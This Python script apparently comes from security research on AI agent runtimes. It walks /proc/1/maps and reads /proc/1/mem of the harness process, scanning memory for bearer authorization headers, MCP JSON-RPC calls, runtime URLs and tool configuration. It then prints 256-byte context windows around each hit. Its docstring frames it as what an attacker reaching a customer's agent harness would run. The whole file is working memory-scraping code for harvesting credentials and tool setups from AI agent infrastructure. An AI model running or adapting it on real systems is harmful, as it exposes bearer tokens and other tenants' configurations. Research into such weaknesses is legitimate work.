"""Notebook-15 §4.5 — blind recon of remote_mcp configuration in PID 1.

Reconstructs the harness's `tools=[...]` array WITHOUT canaries or planted
markers. Uses only structural anchors that any AgentCore Runtime + Strands
+ httpx + MCP stack would emit:

  - 'HarnessRemoteMcpConfig' / 'HarnessTool' / 'HarnessHeaders' pydantic class names
  - 'bedrock-agentcore.us-east-1.amazonaws.com/runtimes/' URL prefix
  - HTTP framing: 'HTTP/1.1 200 OK', 'server: uvicorn', 'authorization', 'bearer '
  - MCP JSON-RPC: '"method":"initialize"', '"method":"tools/list"', '"method":"tools/call"'
  - Bedrock toolSpec serialization: '"toolSpec":{"name":"<prefix>_<tool>"...}'

For each anchor hit, dumps a 256-byte context window so the notebook can
extract URL bytes, header dict structure, and tool prefixes WITHOUT
ever knowing what was planted. This is what an attacker who reaches a
random customer's harness would actually do.

Hosted at github.com/nivmorabin/skills/dict-walk/pid1_mcp_blind_recon.py.
"""
import re
import sys


# Structural anchors — none of these depend on customer-specific markers.
ANCHORS = [
    # Pydantic class names (AgentCore loopy schema)
    ('HarnessRemoteMcpConfig', 'pydantic_remote_mcp_config'),
    ('HarnessTool', 'pydantic_harness_tool'),
    ('HarnessHeaders', 'pydantic_harness_headers'),
    ('HarnessToolType', 'pydantic_tool_type_enum'),
    # AgentCore Runtime URL prefix — every remote_mcp pointing at another
    # AgentCore runtime carries this; doesn't appear elsewhere.
    ('bedrock-agentcore.us-east-1.amazonaws.com/runtimes/', 'agentcore_runtime_url_prefix'),
    # HTTP framing — httpx outbound + inbound buffers
    ('HTTP/1.1 200 OK', 'http_response_status'),
    (b'authorization: Bearer'.decode('ascii'), 'authorization_header_lc'),
    ('Authorization: Bearer', 'authorization_header_tc'),
    ('server: uvicorn', 'uvicorn_server_header'),
    # MCP JSON-RPC literals
    ('"method":"initialize"', 'mcp_initialize'),
    ('"method":"tools/list"', 'mcp_tools_list'),
    ('"method":"tools/call"', 'mcp_tools_call'),
    ('"protocolVersion":"2024-11-05"', 'mcp_protocol_version'),
    # Bedrock converseStream tool serialization
    ('"toolSpec":{"name":"', 'bedrock_toolspec'),
]


def main():
    # Enumerate writable-private anonymous regions.
    regions = []
    with open('/proc/1/maps', 'r') as f:
        for line in f:
            parts = line.split()
            if len(parts) < 5:
                continue
            addr_range, perms = parts[0], parts[1]
            path = parts[5] if len(parts) >= 6 else ''
            if not perms.startswith('rw-') or path:
                continue
            try:
                start_s, end_s = addr_range.split('-')
                regions.append((int(start_s, 16), int(end_s, 16)))
            except Exception:
                continue
    print(f'WRITABLE_PRIVATE_ANON_REGIONS={len(regions)}')

    with open('/proc/1/mem', 'rb') as mem:
        for needle, label in ANCHORS:
            needle_b = needle.encode('utf-8')
            count = 0
            samples = []
            for start, end in regions:
                size = end - start
                try:
                    mem.seek(start)
                    chunk = mem.read(size)
                except Exception:
                    continue
                idx = -1
                while True:
                    idx = chunk.find(needle_b, idx + 1)
                    if idx < 0:
                        break
                    count += 1
                    if len(samples) < 3:
                        # 256-byte window: enough to capture a full URL or HTTP request line
                        ws = max(0, idx - 64)
                        we = min(len(chunk), idx + len(needle_b) + 192)
                        samples.append({
                            'va': hex(start + idx),
                            'context': chunk[ws:we],
                        })
            print(f'\nANCHOR[{label}]_NEEDLE={needle!r}')
            print(f'ANCHOR[{label}]_OCCURRENCES={count}')
            for i, s in enumerate(samples):
                print(f'ANCHOR[{label}]_SAMPLE[{i}]_VA={s["va"]}')
                print(f'ANCHOR[{label}]_SAMPLE[{i}]_CONTEXT={s["context"]!r}')

    print('\nBLIND_RECON_VERDICT=COMPLETE')


if __name__ == '__main__':
    main()
